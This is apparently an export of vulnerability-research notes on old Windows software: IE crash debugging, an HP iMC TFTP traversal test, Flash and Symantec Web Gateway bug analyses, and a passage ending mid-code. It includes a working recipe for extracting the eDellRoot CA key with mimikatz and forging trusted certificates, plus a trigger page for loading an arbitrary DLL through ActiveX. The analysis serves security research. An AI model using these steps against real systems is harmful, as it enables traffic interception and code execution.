mshtml!CInput::VersionedInvokeEx+0x0000002d\n    63642eec mshtml!PlainInvokeEx+0x000000ea\n\n.text:635C4A2E ; public: static long __stdcall CAnchorElement::CreateElement(class CHtmTag *, class CDoc *, class CElement * *)\n.text:635C4A2E ?CreateElement@CAnchorElement@@SGJPAVCHtmTag@@PAVCDoc@@PAPAVCElement@@@Z proc near\n.text:635C4A2E                                         ; DATA XREF: .text:6364B798\u0019o\n.text:635C4A2E\n.text:635C4A2E arg_4           = dword ptr  0Ch\n.text:635C4A2E arg_8           = dword ptr  10h\n.text:635C4A2E\n.text:635C4A2E ; FUNCTION CHUNK AT .text:638589CC SIZE 0000000A BYTES\n.text:635C4A2E\n.text:635C4A2E                 mov     edi, edi\n.text:635C4A30                 push    ebp\n.text:635C4A31                 mov     ebp, esp\n.text:635C4A33                 push    esi\n.text:635C4A34                 push    edi\n.text:635C4A35                 push    68h             ; dwBytes\n.text:635C4A37                 push    8               ; dwFlags\n.text:635C4A39                 push    _g_hProcessHeap ; hHeap\n.text:635C4A3F                 xor     edi, edi\n.text:635C4A41                 call    ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)\n\n\n\n0:008> r\neax=63aae200 ebx=06a20fb0 ecx=06a32f98 edx=00000000 esi=037cd1e0 edi=00000000\neip=6363fcc4 esp=037cd1b4 ebp=037cd1cc iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc:\n6363fcc4 8b01            mov     eax,dword ptr [ecx]  ds:0023:06a32f98=????????\n\n0:008> dds 63630788+0x70 L1\n636307f8  6363fc94 mshtml!CElement::SecurityContext\n\n\n\n0:008> k\nChildEBP RetAddr\n037cd1b0 63602718 mshtml!CElement::Doc\n037cd1cc 636026a3 mshtml!CTreeNode::ComputeFormats+0xb9\n037cd478 63612a85 mshtml!CTreeNode::ComputeFormatsHelper+0x44\n037cd488 63612a45 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11\n037cd498 63612a2c mshtml!CTreeNode::GetFancyFormatHelper+0xf\n037cd4a8 63717f30 mshtml!CTreeNode::GetFancyFormat+0x35\n037cd4b4 6371dbcf mshtml!ISpanQualifier::GetFancyFormat+0x5a\n037cd4c0 6371db8f mshtml!SRunPointer::IsRelativeSpanEdge+0x3a\n037cd4c8 637224a7 mshtml!SRunPointer::IsRelativeSpan+0x14\n037cd4e8 63722412 mshtml!CDisplayBoxProperties::GetHasInlineOutlines+0x7d\n037cd518 63723ccf mshtml!CDisplayBoxProperties::SetDisplayBoxProperties+0x24d\n037cd89c 63723c13 mshtml!CPtsTextParaclient::SetupTextDisplayBox+0x90\n037cd924 63723b48 mshtml!CPtsTextParaclient::SetupDisplayBoxForSpan+0x66\n037cda10 6370e989 mshtml!CPtsTextParaclient::SetupDisplayBox+0x203\n037cdac8 6370e73e mshtml!CPtsBfcBlockParaclient::SetupDisplayBoxForTrack+0x2b7\n037cde48 636ccc93 mshtml!CPtsBfcBlockParaclient::SetupDisplayBox+0x349\n037cdeec 636cca21 mshtml!CPtsTableContainerParaclient::SetupDisplayBoxForTrack+0x130\n037ce408 6370c515 mshtml!CPtsTableContainerParaclient::SetupDisplayBox+0x2ad\n037ce888 6370c515 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a6\n037ced08 6370e989 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a6\n\n```\n\n\n# Win 7 SP0 + IE8\n\n```\nMicrosoft (R) Windows Debugger Version 6.11.0001.404 X86\nCopyright (c) Microsoft Corporation. All rights reserved.\n....\n0:012> g\n....\n(c20.274): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=6b105100 ebx=08a7ffb0 ecx=08f0ff98 edx=00000000 esi=043fcf78 edi=00000000\neip=6ad8c400 esp=043fcf4c ebp=043fcf64 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CElement::Doc:\n6ad8c400 8b01            mov     eax,dword ptr [ecx]  ds:0023:08f0ff98=????????\n0:005> u\nmshtml!CElement::Doc:\n6ad8c400 8b01            mov     eax,dword ptr [ecx]\n6ad8c402 8b5070          mov     edx,dword ptr [eax+70h]\n6ad8c405 ffd2            call    edx\n6ad8c407 8b400c          mov     eax,dword ptr [eax+0Ch]\n6ad8c40a c3              ret\n6ad8c40b 33c0            xor     eax,eax\n6ad8c40d e9f7aeffff      jmp     mshtml!CAttrArray::PrivateFind+0x8f (6ad87309)\n6ad8c412 90              nop\n0:005> k\nChildEBP RetAddr\n043fcf48 6adb5961 mshtml!CElement::Doc\n043fcf64 6adb586d mshtml!CTreeNode::ComputeFormats+0xba\n043fd210 6adba12d mshtml!CTreeNode::ComputeFormatsHelper+0x44\n043fd220 6adba0ed mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11\n043fd230 6adba0d4 mshtml!CTreeNode::GetFancyFormatHelper+0xf\n043fd240 6ac3b9c4 mshtml!CTreeNode::GetFancyFormat+0x35\n043fd24c 6acb15b0 mshtml!ISpanQualifier::GetFancyFormat+0x5a\n043fd258 6acb156d mshtml!SRunPointer::IsRelativeSpanEdge+0x3a\n043fd260 6acb4c92 mshtml!SRunPointer::IsRelativeSpan+0x14\n043fd290 6acb4bfd mshtml!CDisplayBoxProperties::GetHasInlineOutlines+0x7d\n043fd2c0 6acb532e mshtml!CDisplayBoxProperties::SetDisplayBoxProperties+0x24c\n043fd644 6acb5272 mshtml!CPtsTextParaclient::SetupTextDisplayBox+0x90\n043fd6d4 6acb51a7 mshtml!CPtsTextParaclient::SetupDisplayBoxForSpan+0x66\n043fd7c0 6ac9e4a9 mshtml!CPtsTextParaclient::SetupDisplayBox+0x203\n043fd878 6ac9e271 mshtml!CPtsBfcBlockParaclient::SetupDisplayBoxForTrack+0x2b7\n043fdbf8 6ac57a79 mshtml!CPtsBfcBlockParaclient::SetupDisplayBox+0x352\n043fdc9c 6ac57834 mshtml!CPtsTableContainerParaclient::SetupDisplayBoxForTrack+0x133\n043fe1b8 6ac9d919 mshtml!CPtsTableContainerParaclient::SetupDisplayBox+0x2ad\n043fe638 6ac9d919 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a9\n043feab8 6ac9e4a9 mshtml!CPtsBlockContainerParaclient::SetupDisplayBox+0x4a9\n0:005> !heap -p -a ebx\n    address 08a7ffb0 found in\n    _DPH_HEAP_ROOT @ 51000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                 83d3e04:          8a7ffb0               4c -          8a7f000             2000\n    6d4f8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229\n    77594ea6 ntdll!RtlDebugAllocateHeap+0x00000030\n    77557d96 ntdll!RtlpAllocateHeap+0x000000c4\n    775234ca ntdll!RtlAllocateHeap+0x0000023a\n    6ac2565b mshtml!CHtmRootParseCtx::OverlappedEndElement+0x00000141\n    6ac2557e mshtml!CHtmRootParseCtx::EndElement+0x000000cb\n    6ad17870 mshtml!CHtmTextParseCtx::EndElement+0x0000006e\n    6ad170b8 mshtml!CHtmParse::EndElement+0x0000007b\n    6ad2a4de mshtml!CHtmParse::CloseContainer+0x000001c1\n    6ad292d3 mshtml!CHtmParse::CloseAllContainers+0x00000026\n    6ad18864 mshtml!CHtmParse::PrepareContainer+0x0000007f\n    6ad18907 mshtml!CHtmParse::ParseBeginTag+0x00000028\n    6ad16e93 mshtml!CHtmParse::ParseToken+0x00000082\n    6ad175c9 mshtml!CHtmPost::ProcessTokens+0x00000237\n    6ad078e8 mshtml!CHtmPost::Exec+0x00000221\n    6ad08a99 mshtml!CHtmPost::Run+0x00000015\n    6ad089fd mshtml!PostManExecute+0x000001fb\n    6ad07c66 mshtml!PostManResume+0x000000f7\n    6ad213f6 mshtml!CHtmPost::OnDwnChanCallback+0x00000010\n    6ad053fc mshtml!CDwnChan::OnMethodCall+0x00000019\n    6ada94b2 mshtml!GlobalWndOnMethodCall+0x000000ff\n    6ad937f7 mshtml!GlobalWndProc+0x0000010c\n    75bc86ef USER32!InternalCallWinProc+0x00000023\n    75bc8876 USER32!UserCallWinProcCheckWow+0x0000014b\n    75bc89b5 USER32!DispatchMessageWorker+0x0000035e\n    75bc8e9c USER32!DispatchMessageW+0x0000000f\n    6d8004a6 IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000452\n    6d810446 IEFRAME!LCIETab_ThreadProc+0x000002c1\n    763849bd iertutil!CIsoScope::RegisterThread+0x000000ab\n    75f71174 kernel32!BaseThreadInitThunk+0x0000000e\n    7752b3f5 ntdll!__RtlUserThreadStart+0x00000070\n    7752b3c8 ntdll!_RtlUserThreadStart+0x0000001b\n\n\n0:005> !heap -p -a ecx\n    address 08f0ff98 found in\n    _DPH_HEAP_ROOT @ 51000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    8f50138:          8f0f000             2000\n    6d4f90b2 verifier!AVrfDebugPageHeapFree+0x000000c2\n    77595674 ntdll!RtlDebugFreeHeap+0x0000002f\n    77557aca ntdll!RtlpFreeHeap+0x0000005d\n    77522d68 ntdll!RtlFreeHeap+0x00000142\n    75f6f1ac kernel32!HeapFree+0x00000014\n    6adf8c42 mshtml!CAnchorElement::`vector deleting destructor'+0x00000028\n    6ad97dd0 mshtml!CBase::SubRelease+0x00000022\n    6adf0fdf mshtml!CElement::PrivateExitTree+0x00000011\n    6acd5b42 mshtml!CMarkup::SpliceTreeInternal+0x00000083\n    6acd6ff9 mshtml!CDoc::CutCopyMove+0x000000ca\n    6acd6f39 mshtml!CDoc::Remove+0x00000018\n    6acd6f17 mshtml!RemoveWithBreakOnEmpty+0x0000003a\n    6ac0288a mshtml!CElement::InjectInternal+0x0000032a\n    6acd704a mshtml!CElement::InjectCompatBSTR+0x00000046\n    6af1aee9 mshtml!CElement::put_outerText+0x00000025\n    6ae172d6 mshtml!GS_BSTR+0x000001ac\n    6ae0235c mshtml!CBase::ContextInvokeEx+0x000005dc\n    6ae0c75a mshtml!CElement::ContextInvokeEx+0x0000009d\n    6ae0c79a mshtml!CInput::VersionedInvokeEx+0x0000002d\n    6adb3104 mshtml!PlainInvokeEx+0x000000eb\n    6cdea22a jscript!IDispatchExInvokeEx2+0x00000104\n    6cdea175 jscript!IDispatchExInvokeEx+0x0000006a\n    6cdea3f6 jscript!InvokeDispatchEx+0x00000098\n    6cdea4a0 jscript!VAR::InvokeByName+0x00000139\n    6cdfd8c8 jscript!VAR::InvokeDispName+0x0000007d\n    6cde9c0e jscript!CScriptRuntime::Run+0x0000208d\n    6cdf5c9d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce\n    6cdf5bfb jscript!ScrFncObj::Call+0x0000008d\n    6cdf5e11 jscript!CSession::Execute+0x0000015f\n    6cdef3ee jscript!NameTbl::InvokeDef+0x000001b5\n    6cdeea2e jscript!NameTbl::InvokeEx+0x0000012c\n    6ae27af1 mshtml!CBase::InvokeDispatchWithThis+0x000001e1\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "c6be8c45-69c4-4f51-b039-5552fafc9f35",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "d3369bd6-3098-4473-a075-eb68f35b5a79",
      "created": "2019-09-12T18:07:21.08243Z",
      "revisionDate": "2020-10-21T20:39:22.320685Z",
      "document": "\n\n# Setup\n\n* Windows Server 2003 SP2\n* .Net Framework 3.5 SP1\n* Windows Installer 4.5\n* HP iMC 5.0\n* Microsoft SQL Server 2008 Express\n* LocalSystem to run the service\n* sa account enabled\n* TCP/IP and Named Pipes enabled\n\n# Breakpoints\n\n```\nbp 00402542 \".printf /ow \\\"\\\\nHandling WRQ request\\\\n\\\"; g\"\nbp 00402241 \".printf \\\"File path check for '/', you have:\\\\n\\\"; db esi L1; g\"\nbp 0040225a \".printf \\\"File path check for ':', you have:\\\\n\\\"; db esi+1 L1; g\"\nbp 00402268 \".printf \\\"Searching for '..' in file path, found: %x\\\\n\\\", eax; g\"\nbp 00402277 \".printf /oe \\\"You have hit File Access Violation in RRQ\\\\n\\\"; g\"\n\nbp 00401ea0 \".printf /ow \\\"\\\\nHandling DATA request\\\\n\\\"; g\"\nbp 00402097 \".echo \\\"File handles before open():\\\"; .foreach /pS 1 /ps 1 (h {!handle 0 0x04 File}) {.if ($scmp(\\\"${h}\\\",\\\"type\\\") > -1) {} .elsif ($scmp(\\\"${h}\\\", \\\"handles\\\") > -1) {} .else { .printf \\\"File handle \\\"; .echo h} } ;.echo; g\"\nbp 00402096 \".echo \\\"Opening file handle for path:\\\"; db eax; ; .echo; g\"\nbp 004020a1 \".echo \\\"File handles after open():\\\"; .foreach /pS 1 /ps 1 (h {!handle 0 0x04 File}) {.if ($scmp(\\\"${h}\\\",\\\"type\\\") > -1) {} .elsif ($scmp(\\\"${h}\\\", \\\"handles\\\") > -1) {} .else { .printf \\\"File handle \\\"; .echo h} } ;.echo; g\"\nbp 00402108 \".echo \\\"Writing to file...\\\"; g\"\n```\n\n\n# Thoughts\n\nZDI claims that this is a \"remote code execution\" bug, because a remote user can upload an arbitrary\nfile onto the remote server. In theory, being able to write to the victim machine COULD lead to code\nexecution, but after looking at the bug, it's probably a long shot.\n\nIdeally, an arbitrary WRITE vulnerability requires one of the conditions to be met in order to ensure\nautomatic code execution:\n\n1. The user can traverse their way out, and write the malicious file onto a specific place such as WBEM.\n2. Having the upload folder mapped as a WWW virtual directory. That way you can upload a malicious web\n   script using TFTP, and then send a HTTP request to execute the script.\n3. If there's already an executable placed in the upload folder, and it's called by some other services\n   or programs, in theory you could overwrite that file, and then gain code execution when it's called.\n\nThe technique ZDI is referring to is probably #3, because this is what they say in the advisory:\n\n\t\"When handling WRQ opcode types the server allows arbitrary file creation. Additionally,\"\n\tthe server is configured to truncate/overwrite existing files.\"\n\nHowever, the default upload directory does not have any executable in there, except for a 'License.txt\"\nfile. So attack vector #3 is very unlikely. Note: The default location of that directory is:\n\n```\nC:\\Program Files\\iMC\\server\\tmp\\\n```\n\nAttack vector #2 should also be ruled out, because by default, the upload directory isn't mapped or\nshared to anything.\n\nAnd that leaves us attack vector #1 (dir traversal)...\n\nIt's rather easy to make a WRQ request using the tftp command. Here's an attempt of trying to write to\na location outside of the 'tmp' directory:\n\n```\ntftp> connect 10.0.1.8\ntftp> put /tmp/test.txt ../../../../blah/test.txt\nError code 256: Access voilation.\n```\n\nDuring the above experiment, folder \"blah\" is set to allow full access to \"everyone\".\n\nProcess Monitor also does not show any signs of the tftpserver.exe process attempting to access path\ntest.txt before hitting an \"Access violation\":\n\n```\ntftpserver.exe\t4092\tUDP Receive\tsinn3r-qixn9ta2:tftp -> 10.0.1.3:50839\tSUCCESS\tLength: 40\ntftpserver.exe\t4092\tUDP Send\tsinn3r-qixn9ta2:tftp -> 10.0.1.3:50839\tSUCCESS\tLength: 22\ntftpserver.exe\t4092\tQueryStandardInformationFile\tC:\\Program Files\\iMC\\server\\conf\\log\\tftpserver.2012-09-14.txt\tSUCCESS\tAllocationSize: 4,096, EndOfFile: 2,815, NumberOfLinks: 1, DeletePending: False, Directory: False\ntftpserver.exe\t4092\tQueryStandardInformationFile\tC:\\Program Files\\iMC\\server\\conf\\log\\tftpserver.2012-09-14.txt\tSUCCESS\tAllocationSize: 4,096, EndOfFile: 2,815, NumberOfLinks: 1, DeletePending: False, Directory: False\ntftpserver.exe\t4092\tWriteFile\tC:\\Program Files\\iMC\\server\\conf\\log\\tftpserver.2012-09-14.txt\tSUCCESS\tOffset: 2,815, Length: 132\n```\n\nThis is what we get from the TFTP's log file:\n\n```\n2012-09-14 14:36:27.182 [ERROR (-1)] [THREAD(6196)] [TFTPService::handle_input] Receive error packet\n2012-09-14 14:37:00.869 [ERROR (-1)] [THREAD(6196)] [TFTP::handleRRQ] File Access Voliation,filename=../../../../../blah/test.txt!\n```\n\nBased on these clues, I suspect the \"Access violation\" error is thrown before tftpserver.exe actually\ntries to write 'test.txt' to the file system.\n\nIn particular, this is the code that's the reason we get \"Access violation\" -- when there's a \"..\" in\nour path, we get rejected:\n\n```\n.text:0040225C loc_40225C:                             ; CODE XREF: handleWRQ+84\u0018j\n.text:0040225C                 push    offset SubStr   ; \"..\"\n.text:00402261                 push    esi             ; Str\n.text:00402262                 call    ds:strstr\n.text:00402268                 add     esp, 8\n.text:0040226B                 test    eax, eax\n.text:0040226D                 jz      short loc_402298 ; If no \"..\" found, go to 0x402298\n.text:0040226F\n.text:0040226F loc_40226F:                             ; CODE XREF: handleWRQ+71\u0018j\n.text:0040226F                                         ; handleWRQ+8A\u0018j\n.text:0040226F                 push    esi             ; ArgList\n.text:00402270                 push    offset aTftpHandlerr_2 ; \"[TFTP::handleRRQ] File Access Voliation\"...\n.text:00402275                 push    0FFFFFFFFh      ; int\n.text:00402277                 call    sub_408180\n.text:0040227C                 add     esp, 0Ch\n.text:0040227F                 lea     eax, [esp+0ACh+var_98]\n.text:00402283                 push    eax\n.text:00402284                 mov     ecx, ebp\n.text:00402286                 mov     [esp+0B0h+var_98], 2\n.text:0040228E                 call    buildErrorPacket\n```\n\nOther characters that can lead to the same rejection (part of the same function - 0x004021D0):\n\n```\n.text:00402239                 cmp     eax, 1          ; Make sure there's at least 1 byte of file path to check\n.text:0040223C                 jb      short loc_402243\n.text:0040223E                 cmp     byte ptr [esi], '/' ; Check if the file path begins with \"/\"\n.text:00402241                 jz      short loc_40226F ; Access Violation\n\n.text:0040224F                 sub     eax, edx\n.text:00402251                 cmp     eax, 2          ; Make sure there's at least 2 bytes in the file path\n.text:00402254                 jb      short loc_40225C\n.text:00402256                 cmp     byte ptr [esi+1], ':' ; Check the second byte for \":\"\n.text:0040225A                 jz      short loc_40226F ; Access Violation\n```\n\nEnvironment variables can bypass these checks.  However, it won't be recognized as a legit file path.\n\nHere's the routine that creates/writes the file:\n\n```\n.text:00402096 loc_402096:                             ; CODE XREF: handleDATA+1CD\u0018j\n.text:00402096                                         ; handleDATA+1D9\u0018j\n.text:00402096                 push    eax\n.text:00402097                 lea     ecx, [esp+0B8h+var_94]\n.text:0040209B                 call    ds:?open@?$basic_ofstream@DU?$char_traits@D@std@@@std@@QAEXPBDHH@Z ; std::basic_ofstream<char,std::char_traits<char>>::open(char const *,int,int)\n...\n.text:00402103 loc_402103:                             ; CODE XREF: handleDATA+25C\u0018j\n.text:00402103                 push    ebx\n.text:00402104                 lea     ecx, [esp+0B4h+var_94]\n.text:00402108                 call    ds:?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBDH@Z ; std::basic_ostream<char,std::char_traits<char>>::write(char const *,int)\n```\n\nThe actual file path that will be opened (see that it's also rejected):\n\n```\ntftpserver.exe\t4092\tCreateFile\tC:\\Program Files\\iMC\\server\\tmp\\%SystemDrive%\\blah\\test.txt\tPATH NOT FOUND\tDesired Access: Generic Write, Read Attributes, Disposition: OverwriteIf, Options: Synchronous IO Non-Alert, Non-Directory File, Attributes: N, ShareMode: Read, Write, AllocationSize: 0\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "684dc100-6e09-4ba9-978e-0cf2aab73eb3",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "75d27812-f60e-4f57-a96a-929bbc231185",
      "created": "2019-09-12T18:07:22.305489Z",
      "revisionDate": "2020-02-13T17:12:17.00383Z",
      "document": "\n\n# Details\n\nHow to exploit:\n\n* Export the DER CA certificate (through the windows certificate manager for example).\n* Covert DER CA certificate to PEM\n\n```\nopenssl x509 -in der_edell_root.cer -inform der -outform pem -out edell_root.pem\n```\n\n* Export the certificate private key, use mimikatz\n\n```\ncrypto::certificates /systemstore:local_machine /store:Root /export\n```\n\nThe certificate (again) and its private key will be in the directory where mimikatz lives. The private key is inside the .pfx\n\n* Extract the key from the pfx and save as pem (password: mimikatz)\n\n```\nopenssl pkcs12 -in local_machine_Root_3_eDellRoot.pfx -nocerts -out key.pem -nodes\n```\n\n* Save the file.srl with \u201c6C\u201d\n\n* Create a server certificate request\n\n```\nopenssl genrsa -out server.key 1024\nopenssl req -key server.key -new -out server.req\n```\n\nUse the CA certificate and its private key to generate the server certificate:\n\n```\nopenssl x509 -req -in server.req -CA edell_root.pem -CAkey key.pem -CAserial file.srl -out server.pem\n```\n\nprofit!\n\n```ruby\nrequire 'webrick'\nrequire 'webrick/https'\nrequire 'openssl'\n\ncert = OpenSSL::X509::Certificate.new(File.read('server.pem'))\npkey = OpenSSL::PKey::RSA.new(File.read('server.key'))\n\nserver = WEBrick::HTTPServer.new(:Port => 8000, :SSLEnable => true, :SSLCertificate => cert, :SSLPrivateKey => pkey)\nserver.start\n```\n\nGo to localhost:8000/test.html, you should see that eDellRoot has identified the site as localhos,\nand that your connection is trusted.\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e65918b4-e877-4dab-a299-d0df12eee8d0",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "6e154980-fa08-4508-92b1-213f5c0befbb",
      "created": "2019-09-12T18:07:22.97424Z",
      "revisionDate": "2020-02-13T17:12:16.76648Z",
      "document": "\n\nThe specific flaw exists within the ISProxy.dll ActiveX object. The ISCreateObject() method suffers from a directory vulnerability and it is also possible to break the search path through a null char. By combining the Initialize() and ISCreateObject() methods, an attacker can force the underlying operating system to load arbitrary dlls bypassing normal security restriction. This vulnerability allows an attacker to execute code under the context of the process.\n\n(1) Legit Code Samples\n\n```\nvar file = new ActiveXObject(\"ISProxy.Proxy\");\nfile.ISCreateObject(document, \"isutil.dll\", \"{A5CF09AF-F2FC-4E5D-9F7D-419D28130E62}\");\n\nvar objMgr = new ActiveXObject(\"ISProxy.Proxy\");\nobjMgr.ISCreateObject(document, \"isobjmgr.dll\", \"{DE5FBA5D-8AB0-4a53-B620-F2065702D228}\");\n```\n\n# Vulnerable code\n\nForm ISProxy.dll\n\n```\n.text:63371561                 push    eax             ; lpPathName => C:\\Documents and Settings\\system\n.text:63371562                 call    esi ; SetCurrentDirectoryA\n.text:63371564                 lea     ecx, [ebp+var_38]\n.text:63371567                 mov     byte ptr [ebp+var_4], 2\n.text:6337156B                 call    sub_6337186D\n.text:63371570                 lea     ecx, [ebp+var_68]\n.text:63371573                 call    sub_63372927\n.text:63371578                 push    eax             ; lpLibFileName => Controlled from the second arg\n.text:63371579                 call    ds:LoadLibraryA\n.text:6337157F                 mov     edi, eax\n.text:63371581                 lea     eax, [ebp+PathName]\n.text:63371587                 push    eax             ; lpPathName\n.text:63371588                 call    esi ; SetCurrentDirectoryA\n```\n\n# Trigger\n\n\nThe next HTML will try to load c:\\test.dll\n\n```\n<html>\n<object classid='clsid:A1000F0F-9C12-4AB3-B195-02BE93328283' id='test'></object>\n<script language='javascript'>\ntest.Initialize(document);\ntest.ISCreateObject(document, \"..\\\\..\\\\test.dll\", \"A1000F0F-9C12-4AB3-B195-02BE93328283\");\n</script>\n</html>\n```\n\nSo the vulnerability, as explained by the ZDI advisory allows to load an arbitrary DLL from the underliying OS, but I dont see how to load it from an arbitrary remote location.\n\nSo in order to achieve remote code execution you need to plant a DLL previously in the targeted file system.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ee091db4-678c-4312-84ae-93fd32302bfa",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "49bfa54b-5c07-4f82-a637-56b655bc873a",
      "created": "2019-09-12T18:07:24.826588Z",
      "revisionDate": "2020-02-13T17:12:16.554552Z",
      "document": "\n\n## Details\n\nThis is a vulnerability in Adobe Flash. It is due to an incomplete patch of CVE-2015-5560. The decode_buffer_size is calculated this way in Flash:\n\n```c\ndecode_buffer_size = (encode_data_size \u2013 1) * 6 + 2\n```\n\nIn asm:\n\n```\n.text:10024F13 loc_10024F13:                           ; CODE XREF: sub_10024C79+278j\n.text:10024F13                 mov     eax, ebx\n.text:10024F15                 imul    eax, 6\n.text:10024F18                 add     eax, 2\n.text:10024F1B                 cmp     [esi+28h], eax\n.text:10024F1E                 mov     [ebp+var_20], eax\n.text:10024F21                 jge     short loc_10024F4D\n```\n\nDuring decoding, the buffer can be reallocated:\n\n```c\nint current_buffer_size\n\nint decoded_buffer_size\n\nif (current_buffer_size  < decoded_buffer_size) {\n\n// reallocate the decode buffer\n\n}\n```\n\nIf the encode_data_size is larger than 0x2aaaaaab, it will cause an integer overflow in the\ncalculation of ```(encode_data_size \u20131) * 6 + 2```\n\n## Patch for CVE-2015-5560\n\nVersion 18.0.0.232:\n\n```\n.text:10024E3E                 mov     eax, [ebp+var_14]\n.text:10024E41                 imul    eax, 6\n.text:10024E44                 inc     eax\n.text:10024E45                 inc     eax\n.text:10024E46                 cmp     eax, [ebp+var_14]\n.text:10024E49                 jbe     loc_10024FB8\n```\n\n```\n(encode_data_size * 6 + 2) >  encode_data_size\n```\n\n## Analysis of CVE-2015-8446\n\nIf the patch is bypassed, we have CVE-2015-8446.\n\nIf ```encode_data_size``` is 0x15555580:\n\n```\n(0x15555580 \u2013 1) * 6 + 2 = 0x800000FC\n```\n\nWhich is less than 0.\n\nAnd then that can cause an overflow.\n\n## ByteArray Length Protection\n\nAdobe introduced the ByteArray Length Protection in December, which would make exploitation\ndifficult against newer versions of Adobe Flash.\n\nIt is likely the exploit in the wild exploited an older version of Adobe Flash (this needs to be\nconfirmed).\n\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "67aa289f-00dd-4269-9ac0-021bbb5d394c",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "e371a741-0446-47e4-97e5-21715e5ea84a",
      "created": "2019-09-12T18:07:25.507441Z",
      "revisionDate": "2020-10-21T20:42:39.907709Z",
      "document": "\n\nThis vulnerability allows remote attackers to execute arbitrary code on vulnerable installations\nof Symantec Web Gateway. Authentication is not required to exploit this vulnerability.\n\nThe specific flaw exists because Symantec Web Gateway allows unauthenticated users to upload a file\nwhile preserving the file extension. This allows users to upload additional script files that can\nbe used to execute remote code from user supplied commands under the context of the webserver.\n\n## Details\n\n**blocked_file**\n\n```php\n<?php\n\tinclude_once(\"config/conf.php\");\n\tinclude_once(\"config/db.php\");\n\tinclude_once(\"includes/util_functions.php\");\n\n\n\tif (isset($_POST['submitted']))\n\t{\n\t\t$updated = true;\n\t\tunescape_form_vals(); // remove slashes form values\tas we are displaying only\n\n\t\t$new_image = $_FILES['new_image'];\n\t\t$before_filename = $_POST['before_filename'];\n\t\t$after_filename = $_POST['after_filename'];\n\n\t\t$image_query = \"select value from mi5_blockpagemsg where name='image_name'\";\n\t\t$image_result = @mysql_query($image_query);\n\t\t$image_row = @mysql_fetch_assoc($image_result);\n\t\t$old_image_name = $image_row['value'];\n\t\t@mysql_free_result($image_result);\n\t\t$image_name = $old_image_name;\n\t\t$image_url = $upload_image_url . \"/\". $image_name;\n\n\t\tif ($new_image['error'] == UPLOAD_ERR_OK && $new_image['size'] > 0) // file is uploaded\n\t\t{\n\t\t\t$return_arr = upload_file($new_image, $upload_image_path_temp, \"temp\");\n\t\t\tif ($return_arr['uploaded'])\n\t\t\t{\n\t\t\t\t$image_name = $return_arr['new_file_name'];\n\t\t\t\t$image_url = $upload_image_url_temp . \"/\". $image_name;\n\t\t\t}\n\t\t}\n\t}\n\n?>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<title>Blocked File Download</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\" />\n<link rel=\"stylesheet\" href=\"styles/mi5.css\" />\n</head>\n\n<body>\n<div id=\"mainContent\">\n\n<div id=\"mainText\">\n<?php\n\n\t\t\t\tif ($image_name == '')\n\t\t\t\t{\n\t\t\t\t\t$image_url = \"images/mi5.gif\";\n\t\t\t\t}\n\n\t\t\t?>\n              <img src=\"<?php echo $image_url . \"?t=\".time(); ?>\" alt=\"Symantec Defense Centre\" style=\"border: 1px solid #ddd;\" /> <hr noshade=\"noshade\" size=\"1\" style=\"margin-bottom: 10px;\" />\n<table><tr><!--<td valign=\"top\" style=\"width: 120px;\">\n\n  <p><a href=\"javascript:history.go(-1);\">&laquo; Previous Page</a></p>\n\n</td>-->\n\n<td style=\"padding-left: 15px; border-left: 1px solid #999;\">\n<h3>Symantec Enterprise Spygate</h3>\n<h1>Downloading this file is prohibited</h1>\n  <p><?php echo $before_filename; ?> %%File%%<?php echo $after_filename; ?></p>\n\n<p>If you think this spyware detection was in error, please click here.</p>\n\n</td></tr></table>\n\n</div>\n<div class=\"copyright\">&copy; Copyright 2004-2006, Symantec</div>\n</div>\n\n\n</body>\n</html>\n```\n\n**blocked_url**\n\n```php\n<?php\n\tinclude_once(\"config/conf.php\");\n\tinclude_once(\"config/db.php\");\n\tinclude_once(\"includes/util_functions.php\");\n\n\n\tif (isset($_POST['submitted']))\n\t{\n\t\t$updated = true;\n\t\tunescape_form_vals(); // remove slashes form values\tas we are displaying only\n\n\t\t$new_image = $_FILES['new_image'];\n\t\t$before_url = $_POST['before_url'];\n\t\t$after_url = $_POST['after_url'];\n\n\t\t$image_query = \"select value from mi5_blockpagemsg where name='image_name'\";\n\t\t$image_result = @mysql_query($image_query);\n\t\t$image_row = @mysql_fetch_assoc($image_result);\n\t\t$old_image_name = $image_row['value'];\n\t\t@mysql_free_result($image_result);\n\t\t$image_name = $old_image_name;\n\t\t$image_url = 